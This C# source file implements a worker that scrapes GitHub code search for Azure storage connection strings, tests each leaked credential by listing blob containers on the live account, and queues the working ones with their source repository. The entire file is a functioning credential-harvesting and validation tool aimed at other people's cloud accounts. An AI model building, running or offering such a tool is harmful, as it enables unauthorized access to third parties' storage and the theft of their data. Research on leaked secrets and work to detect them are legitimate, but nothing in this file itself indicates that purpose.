using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Queue;
using Newtonsoft.Json;

namespace CodeSearch
{
    public class CodeSearchWorker : Worker
    {
        private const string StorageEnvVarName = "CODESEARCH_STORAGE";
        private const string QueueName = "tested-connection-strings";

        private const int MaxPageNumber = 100;
        private readonly TimeSpan ShortDelay = TimeSpan.FromSeconds(3);
        private readonly TimeSpan LongDelay = TimeSpan.FromSeconds(10);

        private string searchTerm;
        private int pageNumber;
        private Queue<IdentifiedConnectionString> queuedConnectionStrings;
        private HashSet<IdentifiedConnectionString> identifiedConnectionStrings;
        private CloudQueue messageQueue;

        public CodeSearchWorker(string searchTerm)
        {
            this.searchTerm = searchTerm;
            this.pageNumber = 0;
            this.identifiedConnectionStrings = new HashSet<IdentifiedConnectionString>();
            this.queuedConnectionStrings = new Queue<IdentifiedConnectionString>();

            var cloudAccount = CloudStorageAccount.Parse(Environment.GetEnvironmentVariable(StorageEnvVarName));
            this.messageQueue = cloudAccount.CreateCloudQueueClient().GetQueueReference(QueueName);
        }

        public override Task Setup(CancellationToken cancellationToken)
        {
            this.messageQueue.CreateIfNotExistsAsync(cancellationToken);
            return base.Setup(cancellationToken);
        }

        public override Task<TimeSpan> RunIteration(CancellationToken cancellationToken)
        {
            if (this.queuedConnectionStrings.Count == 0)
            {
                return this.ScrapConnectionStrings(cancellationToken);
            }

            return this.TestConnectionString(cancellationToken);
        }

        private async Task<TimeSpan> TestConnectionString(CancellationToken cancellationToken)
        {
            if (this.queuedConnectionStrings.Count == 0)
            {
                return ShortDelay;
            }

            var connStr = this.queuedConnectionStrings.Dequeue();

            CloudStorageAccount cloudAccount;
            if (CloudStorageAccount.TryParse(connStr.ConnectionString, out cloudAccount) == false)
            {
                return TimeSpan.Zero;
            }

            if (CloudStorageAccount.DevelopmentStorageAccount.Credentials.AccountName.Equals(cloudAccount.Credentials.AccountName, StringComparison.OrdinalIgnoreCase))
            {
                return TimeSpan.Zero;
            }

            try
            {
                var blobClient = cloudAccount.CreateCloudBlobClient();
                await blobClient.ListContainersSegmentedAsync(continuationToken: null);
                await this.QueueMessage(connStr);

                Trace.TraceInformation("Found connection string: Repo = {0}; Storage Account = {1}", connStr.Repository, cloudAccount.Credentials.AccountName);
            }
            catch
            {
            }

            return TimeSpan.Zero;
        }

        private Task QueueMessage(IdentifiedConnectionString connStr)
        {
            var message = new CloudQueueMessage(JsonConvert.SerializeObject(connStr));
            return this.messageQueue.AddMessageAsync(message);
        }

        private async Task<TimeSpan> ScrapConnectionStrings(CancellationToken cancellationToken)
        {
            this.CheckPageNumber();
            this.pageNumber++;
            string url = string.Format("https://github.com/search?o=desc&q={0}&s=indexed&type=Code&p={1}", this.searchTerm, this.pageNumber);

            using (var httpClient = new HttpClient()) { 
            using (var getResponse = await httpClient.GetAsync(url, cancellationToken))
            using (var responseStream = await getResponse.Content.ReadAsStreamAsync())
            {
                var newConnectionStrings = GitHubPage
                    .IdentifyConnectionStrings(responseStream)
                    .Distinct()
                    .Except(this.identifiedConnectionStrings);

                if (newConnectionStrings.Any() == false)
                {
                    return LongDelay;
                }

                foreach (var connStr in newConnectionStrings)
                {
                    this.identifiedConnectionStrings.Add(connStr);
                    this.queuedConnectionStrings.Enqueue(connStr);
                }
            }}

            Trace.TraceInformation("Page {0} scrapped.", this.pageNumber);

            return this.pageNumber >= MaxPageNumber ? LongDelay : ShortDelay;
        }

        private void CheckPageNumber()
        {
            if (this.pageNumber >= MaxPageNumber)
            {
                this.pageNumber = 0;
            }
        }
    }
}
